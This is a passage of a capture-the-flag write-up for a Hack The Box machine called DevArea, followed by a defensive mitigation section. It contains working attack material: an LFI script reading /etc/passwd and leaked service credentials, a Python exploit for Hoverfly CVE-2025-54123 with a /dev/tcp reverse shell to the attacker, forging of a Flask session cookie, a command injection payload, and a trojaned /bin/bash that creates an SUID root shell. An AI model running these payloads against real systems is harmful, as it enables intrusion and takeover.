fi

if [ -z "$B64" ]; then

&#x20;   echo "[!] No content found in response (permission denied or file does not exist)."

&#x20;   echo "[*] Raw response:"

&#x20;   echo "$RESPONSE"

&#x20;   exit 1

fi

echo "[+] File: $FILE"

echo "[+] Content:"

echo "$B64" | base64 -d 2>/dev/null || echo "$B64"
```

- 🔍 *Lets execute it*

```text
/exploit.sh file:///etc/passwd

[+] File: file:///etc/passwd

[+] Content:

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin

_apt:x:42:65534::/nonexistent:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin

systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin

messagebus:x:101:102::/nonexistent:/usr/sbin/nologin

systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin

pollinate:x:102:1::/var/cache/pollinate:/bin/false

polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin

syslog:x:103:104::/nonexistent:/usr/sbin/nologin

uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin

tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin

tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false

landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin

fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin

usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

sshd:x:109:65534::/run/sshd:/usr/sbin/nologin

dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash

ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin

syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin

postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin

_laurel:x:999:987::/var/log/laurel:/bin/false

dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

- 🔍 *we have a user dev_ryan!*

- 🔍 *Now as we know that there is this hoverfly running on port 8888, its a dashboard, which needs login creds, and now that we can read the file system, there might be a way in to read the configuration file for this, it might be running somewhere in the background! as some service file.*

```text
hoverfly.service
```

> [!IMPORTANT]
> In a Linux environment, a .service file located in /etc/systemd/system/ is a Unit file used by systemd to manage background services (daemons)

```text
1\. What does this file contain?

&#x09;This specific file defines how the Hoverfly process is started, stopped, and configured on the server. Because you are hunting for credentials or entry points, this is a "gold 	mine" for three things:

&#x09;ExecStart=: The exact command used to launch Hoverfly. This often contains hardcoded passwords or API keys passed as flags (e.g., -username admin -password secret)

&#x09;User= and Group=: Tells you which user account is running the service (e.g., dev_ryan). If you compromise Hoverfly, you inherit this user's permissions

&#x09;Environment=: Often contains sensitive environment variables like HOVERFLY_AUTH_TOKEN or database connection strings
```

- 🔍 *Lets use the above bash script to read the content.*

```text
./exploit.sh  file:///etc/systemd/system/hoverfly.service

[+] File: file:///etc/systemd/system/hoverfly.service

[+] Content:

[Unit]

Description=HoverFly service

After=network.target

[Service]

User=dev_ryan

Group=dev_ryan

WorkingDirectory=/opt/HoverFly

ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure

RestartSec=5

StartLimitIntervalSec=60

StartLimitBurst=5

LimitNOFILE=65536

StandardOutput=journal

StandardError=journal

[Install]

WantedBy=multi-user.target
```

- 🔍 *Just like said above, it gave us the exact credentials for entry, now lets use these creds in the web dashboard at 8888*

- 🔍 *Logged in, and got a very interesting thing, the version*

```text
Version	v1.11.3

\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 2 - Initial Foothold

- 🔍 *While Searching for known vulnerabilities in this version*

```text
Hoverfly version 1.11.3 and prior are affected by a critical Remote Code Execution (RCE) vulnerability, identified as CVE-2025-54123.

Vulnerability Details:-

The flaw exists in the middleware management API endpoint, specifically at /api/v2/hoverfly/middleware.

Cause: Insufficient validation and sanitization of user input in the binary and script parameters.

Impact: An unauthenticated attacker can inject malicious payloads or execute arbitrary system commands (such as reverse shells) on the host server. These commands run with the same privileges as the Hoverfly process.

Technical Flaws: The issue stems from a combination of insufficient input validation, unsafe command execution, and immediate execution during testing within the service's code.
```

- 🔍 *We got a RCE!!*

- 🔍 *now i have tried it with some attempts but getting some failures, then i understood the flow with AI*

> [!NOTE]
> Why previous attempts failed

```text
DTD/XXE Blocked: Your first attempt failed because the XML parser (Jetty/CXF) had a security filter that killed any request containing a <!DOCTYPE> tag.

The "Unexpected Wrapper" (Namespace): Your manual attempts often triggered 500 errors because of a missing trailing slash (/) in the namespace or missing fields in the Report object. Java/SOAP is extremely "picky"—if the XML doesn't match the .class file perfectly, it crashes.

No Trigger: Even when you successfully updated the middleware manually, nothing happened. This is because Hoverfly only runs middleware when it processes a request. If nobody is using the proxy, your "attack" just sits in memory doing nothing.
```

- 🔍 *I later on get to know that it runs 2 ports*

```text
8888 (Admin Control): This is where you change settings and upload scripts.

8500 (The Proxy): This is where the actual data flows.

By sending a request to port 8500, we forced the server to process data, which triggered the "Middleware" we uploaded to port 8888.
```

- 🔍 *So it means to trigger the middleware we need to use the proxy.*

- 🔍 *lets make an automated python script for this whole attack*

```text
import requests

import sys

import json

import subprocess

import time

# --- CONFIGURATION ---

BASE_URL = "http://devarea.htb:8888"

PROXY_URL = "http://devarea.htb:8500"

USER = "admin"

PASS = "O7IJ27MyyXiU"

def get_token():

&#x20;   print("[*] Requesting Bearer Token...")

&#x20;   url = f"{BASE_URL}/api/token-auth"

&#x20;   data = {"username": USER, "password": PASS}

&#x20;   try:

&#x20;       r = requests.post(url, json=data)

&#x20;       token = r.json().get("token")

&#x20;       if token:

&#x20;           print(f"[+] Token obtained: {token[:15]}...")

&#x20;           return token

&#x20;   except Exception as e:

&#x20;       print(f"[-] Failed to get token: {e}")

&#x20;   return None

def set_middleware(token, script):

&#x20;   url = f"{BASE_URL}/api/v2/hoverfly/middleware"

&#x20;   headers = {

&#x20;       "Authorization": f"Bearer {token}",

&#x20;       "Content-Type": "application/json"

&#x20;   }

&#x20;   payload = {

&#x20;       "binary": "/bin/bash",

&#x20;       "script": script

&#x20;   }

&#x20;   r = requests.put(url, headers=headers, json=payload)

&#x20;   return r.status_code, r.text

def trigger_proxy():

&#x20;   print("[*] Triggering middleware via Proxy...")

&#x20;   proxies = {

&#x20;       "http": f"http://{USER}:{PASS}@devarea.htb:8500",

&#x20;   }

&#x20;   try:

&#x20;       # We use a background-like trigger by setting a short timeout

&#x20;       requests.get("http://devarea.htb/", proxies=proxies, timeout=2)

&#x20;   except requests.exceptions.RequestException:

&#x20;       # Timeout is expected if the shell hangs the process

&#x20;       pass

def main():

&#x20;   token = get_token()

&#x20;   if not token: sys.exit(1)

&#x20;   # 1. TEST PHASE (whoami)

&#x20;   print("[*] Testing RCE with 'whoami'...")

&#x20;   # Using a simple script that creates a file in /tmp to verify execution

&#x20;   status, res = set_middleware(token, "whoami > /tmp/pwned")

&#x20;   if status == 200:

&#x20;       trigger_proxy()

&#x20;       print("[+] 'whoami' command sent. If the API returned 200, we are ready.")

&#x20;   else:

&#x20;       print(f"[-] Middleware setup failed: {res}")

&#x20;       sys.exit(1)

&#x20;   # 2. REVERSE SHELL PHASE

&#x20;   print("\\n" + "="*40)

&#x20;   print("STEP: SETUP YOUR LISTENER (nc -lvnp 4444)")

&#x20;   print("="*40)

&#x20;   lhost = input("Enter your HTB VPN IP: ")

&#x20;   lport = input("Enter Port [4444]: ") or "4444"

&#x20;   rev_shell_script = f"#!/bin/bash\\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

&#x20;

&#x20;   print(f"[*] Setting Reverse Shell for {lhost}:{lport}...")

&#x20;   status, res = set_middleware(token, rev_shell_script)

&#x20;

&#x20;   if status == 200:

&#x20;       print("[+] Middleware updated. Triggering shell now...")

&#x20;       trigger_proxy()

&#x20;       print(f"[+] Done. Check your listener at {lhost}:{lport}!")

&#x20;   else:

&#x20;       print(f"[-] Failed to set shell: {res}")

if __name__ == "__main__":

&#x20;   main()
```

- 🔍 *Explanation -*

```text
&#x20;The Logic of the Script

The Python script automates the four critical stages of the attack:

Authentication (The Token): It hits /api/token-auth. This is the modern way APIs handle logins. Instead of sending your password every time, you exchange it once for a JWT (JSON Web Token). The script grabs this token so it can "prove" it's admin for the next steps.

Weaponization (The Middleware): Hoverfly has a feature called Middleware. It’s meant for developers to "tweak" API responses using scripts. We abused this by telling Hoverfly: "Hey, use /bin/bash as your tool and run my reverse shell as the script."

Execution (The Proxy Trigger): This was the missing link. The script uses the requests proxy settings to send a fake request through the Hoverfly service (Port 8500).

&#x20;  Hoverfly sees a request coming in.

&#x20;  It says, "Wait, I have middleware I need to run first!"

&#x20;  It executes /bin/bash with your shell payload.

The Shell: Since Hoverfly is running as a service, the shell it "pops" inherits the permissions of the user running it (likely dev_ryan).
```

- 🔍 *On listener!*

```text
nc -lvnp 4444

listening on [any] 4444 ...

connect to [10.10.15.183] from (UNKNOWN) [10.129.14.43] 37638

bash: cannot set terminal process group (1423): Inappropriate ioctl for device

bash: no job control in this shell

dev_ryan@devarea:/opt/HoverFly$ cat /home/ryan_dev/user.txt

cat /home/ryan_dev/user.txt

cat: /home/ryan_dev/user.txt: No such file or directory

dev_ryan@devarea:/opt/HoverFly$ cd /home

cd /home

dev_ryan@devarea:/home$ ls

ls

dev_ryan

dev_ryan@devarea:/home$ cd dev_ryan

cd dev_ryan

dev_ryan@devarea:~$ ls

ls

syswatch-v1.zip

user.txt

\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 3 - Privilege Escalation

- 🔍 *So lets see what this user got for us.*

```text
dev_ryan@devarea:/tmp$ sudo -l

sudo -l

Matching Defaults entries for dev_ryan on devarea:

&#x20;   env_reset, mail_badpass,

&#x20;   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,

&#x20;   use_pty

User dev_ryan may run the following commands on devarea:

&#x20;   (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh

&#x20;       web-stop, !/opt/syswatch/syswatch.sh web-restart
```

- 🔍 *No access to the directory*

```bash
sudo /opt/syswatch/syswatch.sh --help

SysWatch 1.0.0

Usage: /opt/syswatch/syswatch.sh <command> [args]

Commands:

&#x20; web                 Start web GUI

&#x20; web-stop            Stop web GUI

&#x20; web-restart         Restart web GUI

&#x20; web-status          Show web GUI status

&#x20; plugin <name> [args] Execute plugin

&#x20; plugins             List available plugins

&#x20; logs <file>         View log file

&#x20; logs --list         List available log files

&#x20; --version           Show version

&#x20; --help|-h|help      Show this help

sudo /opt/syswatch/syswatch.sh web-status

● syswatch-web.service - SysWatch Web GUI

&#x20;    Loaded: loaded (/etc/systemd/system/syswatch-web.service; enabled; preset: enabled)

&#x20;    Active: active (running) since Mon 2026-03-30 14:06:38 UTC; 23h ago

&#x20;  Main PID: 1472 (python)

&#x20;     Tasks: 1 (limit: 4546)

&#x20;    Memory: 25.8M (peak: 26.0M)

&#x20;       CPU: 22.388s

&#x20;    CGroup: /system.slice/syswatch-web.service

&#x20;            └─1472 /opt/syswatch/venv/bin/python /opt/syswatch/syswatch_gui/app.py
```

- 🔍 *Some sort of web service. but running where?*

```text
dev_ryan@devarea:/tmp$ ss -tnlp

ss -tnlp

State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess

LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*    # SSH

LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    # web devarea

LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*    # DNS

LISTEN 0      128        127.0.0.1:7777      0.0.0.0:*    # Custom Probably for syswacth

LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*    # DNS

LISTEN 0      100        127.0.0.1:25        0.0.0.0:*    # SMTP

LISTEN 0      32                 *:21              *:*    # FTP

LISTEN 0      4096            [::]:22           [::]:*    # SSH for IPV6

LISTEN 0      4096               *:8500            *:*    users:(("hoverfly",pid=1460,fd=5))

LISTEN 0      4096               *:8888            *:*    users:(("hoverfly",pid=1460,fd=6))

LISTEN 0      100            [::1]:25           [::]:*

LISTEN 0      50                 *:8080            *:*    users:(("java",pid=1459,fd=26))
```

- 🔍 *Lets tunnel up!*

- 🔍 *Chisel can be used to tunnel up here.*

- 🔍 *once done, go to browser ---> http://127.0.0.1:7777/login*

- 🔍 *it turns out to be a login page, and no found credentials worked*

- 🔍 *while looking at some confs and other files in etc*

```text
syswatch.env

terminfo

thermald

timezone

tmpfiles.d

ubuntu-advantage

ucf.conf

udev

udisks2

ufw

update-manager

update-motd.d

update-notifier

UPower

usb_modeswitch.conf

usb_modeswitch.d

vconsole.conf

vim

vmware-tools

vsftpd.conf

vsftpd.conf.bak

vtrgb

vulkan

wgetrc

X11

xattr.conf

xdg

xml

dev_ryan@devarea:/etc$ cat syswatch.env

cat syswatch.env

SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725

SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026

SYSWATCH_LOG_DIR=/opt/syswatch/logs

SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db

SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins

SYSWATCH_BACKUP_DIR=/opt/syswatch/backup

SYSWATCH_VERSION=1.0.0
```

- 🔍 *okay we got a password and a secret key**!***

- 🔍 *tried to login with the password and username admin, and didn't worked*

- 🔍 *now here is another way, we can forge a session id with this secret key for user admin!*

- 🔍 *Will be using flask to forge the session id*

> [!IMPORTANT]
> What is Flask?

```text
Flask is a lightweight Python web framework. It handles routing, requests, and user sessions.
```

- 🔍 *Flask is nothing but a python framework which can let us decode and forge cookies based on the structure provided.*

```text
[*] Install it with --> pip3 install flask-unsign
```

- 🔍 *First we need to get a sample cookie from that web, in order to forge a new session with allowed structure.*

- 🔍 *Once you got the session id from the web, just decode it*

```text
flask-unsign --decode \\

\--cookie 'eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acqVqw.rZ8yUEf9Da2nsafgfRjz4c5lJNQ'

# Output:

# {'user_id': 1, 'username': 'admin'}  # This is the cookie structure
```

- 🔍 *Now lets forge the cookie/session id*

```text
flask-unsign --sign \\

\--cookie "{'user_id': 1, 'username': 'admin'}" \\

\--secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'

eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ac585A.M2WV3-hqkXFz4M9v5W5INXyqya8
```

- 🔍 *We got the cookie for admin, just paste it in browser and we are in!*

- 🔍 *While looking at the service, it seems like bunch of logs are there, and details about service.*

- 🔍 *When i captured the POST request for this 'service-status' endpoint which basically has an input field, that lets us know the status of services (e.g.:-ssh, ftp, etc )*

```text
POST /service-status HTTP/1.1

Host: 127.0.0.1:7777

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 11

Origin: http://127.0.0.1:7777

Connection: close

Referer: http://127.0.0.1:7777/service-status

Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ac585A.M2WV3-hqkXFz4M9v5W5INXyqya8

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: same-origin

Sec-Fetch-User: ?1

Priority: u=0, i

service=ssh
```

- 🔍 *This service parameter looks kinda fishy, because, if we look closely the backend might be running systemctl status {input}*

- 🔍 *Lets try to use pipe operator to execute any system command.*

```text
POST /service-status HTTP/1.1

Host: 127.0.0.1:7777

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 18

Origin: http://127.0.0.1:7777

Connection: close

Referer: http://127.0.0.1:7777/service-status

Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ac585A.M2WV3-hqkXFz4M9v5W5INXyqya8

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: same-origin

Sec-Fetch-User: ?1

Priority: u=0, i

service=ssh|whoami
```

- 🔍 *It worked, i got 'Syswatch' in the output.*

> [!IMPORTANT]
> Pipe's significance

```text
systemctl status ssh | whoami

```

Here `id` \\\\\\*\\\\\\*doesn't read stdin at all\\\\\\*\\\\\\*. It just runs and prints user info regardless. So the pipe here is being abused purely as a \\\\\\*\\\\\\*command chaining operator\\\\\\*\\\\\\*.

```

systemctl status ssh    →    outputs service status text

&#x20;        |              →    pipe created (but id ignores it)

&#x20;     whoami            →    runs independently, prints current user
```

- 🔍 *The pipe was created and ignored or we can say bypassed. and the id command ran independently.*

- 🔍 *We got everything we needed, Remote code execution directly on the server!*

- 🔍 *Tried using reverse shell payload, didn't worked, with single as well as double URL encode, the server side firewall might have something that is blocking it, which i just don't know!*

- 🔍 *It runs systemctl status {service_name_from_input} and whenever i try to use some built utilities like cat, head, more etc to read the content it just gives me an error of "Invalid service name", while when i run only the commands name like systemctl status cat it gives me the details of cat flags and usage! which is strange.*

- 🔍 *Means we almost have this vulnerability of RCE but we just unable to get success. fuckking hell! HTB sometimes sucks.*

```text
[:] Lets try something else.
```

- 🔍 *While enumerating i found one critical thing*

```text
dev_ryan@devarea:/tmp$ ls -la /bin/bash

ls -la /bin/bash

\-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash
```

- 🔍 *Fucking bin bash is writeable!*

```text
\-rwxrwxrwx

&#x20;↑↑↑↑↑↑↑↑↑

&#x20;|||||||||

&#x20;||||||└└└─ others:  r=read w=write x=execute  ← EVERYONE

&#x20;|||└└└──── group:   r=read w=write x=execute

&#x20;└└└─────── owner:   r=read w=write x=execute
```

> [!IMPORTANT]
> Why is This Catastrophic?

```text
/bin/bash is the most executed binary on the system. Everything uses it:

cron jobs        → #!/bin/bash

sudo commands    → calls bash internally

shell scripts    → #!/bin/bash

system services  → use bash for execution

**[!] If you control what /bin/bash does, you control everything that runs bash.**
```

- 🔍 *In our case, we can run syswatch.sh as root. as we saw above (root) NOPASSWD: /opt/syswatch/syswatch.sh*

- 🔍 *Means that the script starts with !/bin/bash which i can control!*

- 🔍 *attack chain -->*

```bash
sudo syswatch.sh          ← runs as ROOT

&#x20;     ↓

calls /bin/bash           ← which YOU control

&#x20;     ↓

your evil bash runs       ← as ROOT #will copy our evil_bash into the main bin/bash

&#x20;     ↓

profit
```

- 🔍 *We are about to copy the real bash with our fake bash, so we first need to take the backup of the real bash, in order to work further.*

```text
dev_ryan@devarea:/opt/HoverFly$ cp /bin/bash /tmp/bash.bak

cp /bin/bash /tmp/bash.bak

dev_ryan@devarea:/opt/HoverFly$ cd /tmp

cd /tmp

dev_ryan@devarea:/tmp$ ls

ls

bash.bak
```

- 🔍 *Now we have to create a fake bash to be replaced with the real bash!*

```bash
cat << 'EOF' > evil_bash

#!/tmp/bash.bak       			← Line 1: shebang — use REAL bash to run this script

cp /tmp/bash.bak /tmp/rootbash		← Line 2: copy real bash to /tmp/rootbash

chmod 4755 /tmp/rootbash   		← Line 3: set SUID bit on rootbash (EVIL ACTION)

exec /tmp/bash.bak $@			← Line 4: behave normally, pass all args through

EOF
```

- 🔍 *once done, now lets replace it with our /bin/bash*

```text
dev_ryan@devarea:/tmp$ cp /tmp/evil_bash /bin/bash

cp /tmp/evil_bash /bin/bash

cp: cannot create regular file '/bin/bash': **Text file busy**
```

- 🔍 *Okay so we got this error. i have searched about this error.*

> [!IMPORTANT]
> Its called the ETXTBSY problem :- Linux kernel prevents overwriting a binary that is currently being executed:

```text
Process 1: /bin/bash (your current shell)     ← kernel locks it

Process 2: cp evil_bash /bin/bash             ← BLOCKED
```

- 🔍 *lets check*

```text
dev_ryan@devarea:/tmp$ dd if=/tmp/evil_bash of=/bin/bas

dd if=/tmp/evil_bash of=/bin/bas

dd: failed to open '/bin/bas': Permission denied

dev_ryan@devarea:/tmp$ sudo dd if=/tmp/evil_bash of=/bin/bas

sudo dd if=/tmp/evil_bash of=/bin/bas

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper

sudo: a password is required

dev_ryan@devarea:/tmp$ sudo -S dd if=/tmp/evil_bash of=/bin/bash

sudo -S dd if=/tmp/evil_bash of=/bin/bash

[sudo] password for dev_ryan: SyswatchAdmin2026

Sorry, try again.
```

- 🔍 *Look at the above output, i was getting some errors regrading to the permissions i really don't know why?*

- 🔍 *so i came up with one solution*

- 🔍 *I tried to change the command interpreter to dash (Debian Almquist shell.), and then i killed the bash, so no concurrent processes take place.*

```text
dev_ryan@devarea:/tmp$ dd if=/tmp/evil_bash of=/bin/bash

dd if=/tmp/evil_bash of=/bin/bash

dd: failed to open '/bin/bash': Text file busy

dev_ryan@devarea:/tmp$ dash

dash

$killall -9 bash   --> Killed the bash

$dd if=/tmp/evil_bash of=/bin/bash   --> copied the content 

0+1 records in

0+1 records out

94 bytes copied, 0.00033013 s, 285 kB/s

$sudo /opt/syswatch/syswatch.sh --version  --> This will execute the evil_bash

1.0.0

$/tmp/rootbash -p  --> pawned the root

#whoami

root
```

- 🔍 *Done!*

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Security Assessment Blueprint**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the DevArea system. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Apache CXF XOP XML Injection / LFI (CVE-2022-46364)

> [!WARNING]
> **Vulnerability Profile:**
> The SOAP application is vulnerable to MTOM XOP Include Injection (CVE-2022-46364), enabling unauthenticated LFI by parsing external attachments referenced via custom URIs.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers can read sensitive host configurations, harvest service environment credentials (`hoverfly.service`), and list system usernames, bypassing DTD parsing protections.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update Apache CXF to a version immune to CVE-2022-46364.
> - **Remediation:** Configure XML parsers explicitly to disable external entities and MTOM resolution capabilities.
> - **Detection:** Monitor HTTP request streams for XML nodes containing `xop:Include` or `href="file:///"` tags.

---

### 🔴 Hoverfly Middleware Script OS Command Injection (CVE-2025-54123)

> [!WARNING]
> **Vulnerability Profile:**
> Hoverfly v1.11.3 lacks script validation on the `/api/v2/hoverfly/middleware` interface.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Authenticated attackers can inject arbitrary OS code executed directly by the proxy service user (`dev_ryan`), leading to remote command execution.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Apply Hoverfly security patches to block arbitrary middleware execution paths.
> - **Remediation:** Enforce strong authentication policies and run proxy servers under rootless sandboxes.
> - **Detection:** Track and alert on suspicious child processes spawned by proxy engines (`hoverfly` executing shell sessions).

---

### 🔴 World-Writable System Binaries

> [!WARNING]
> **Vulnerability Profile:**
> The primary shell binary `/bin/bash` has insecure permissions set to `777`.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Any local user can overwrite `/bin/bash` to run arbitrary commands under the context of any process invoking a bash shell (such as systemd services or sudo tasks), escalating instantly to root.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Set strict file ownership (`root:root`) and permission sets (`755`) on all binaries within bin pathways.
> - **Remediation:** Deploy File Integrity Monitoring (FIM) tools (such as Samhain or Tripwire) to block and report modifications to system execution paths.

